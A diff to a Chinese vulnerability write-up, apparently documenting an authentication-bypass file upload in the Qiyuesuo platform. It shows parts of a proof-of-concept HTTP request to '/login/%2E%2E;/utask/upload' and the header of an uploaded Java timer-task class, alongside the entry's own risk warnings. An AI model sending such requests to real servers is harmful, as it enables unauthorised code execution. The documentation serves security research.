@@ -41,7 +41,7 @@ schema_version: "1"
 
 ## 操作风险
 
-文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态；在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态；在线解密或外部服务可能收到凭据及敏感内容。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -62,6 +62,7 @@ POST /login/%2E%2E;/utask/upload HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37
 Connection: close
+Content-Length: 498
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryco2lQ5vxCOn9Aq2R
 Accept-Encoding: gzip
 
@@ -83,7 +84,7 @@ public class qiyuesuo004 extends BaseTimerTask {
 ------WebKitFormBoundaryco2lQ5vxCOn9Aq2R--
 ```
 
-> 请求长度说明：原资料 Content-Length 为 498；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 498；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 
 > 原文: <https://www.yuque.com/xiaokp7/ocvun2/cxxpice0g3tk68ed>
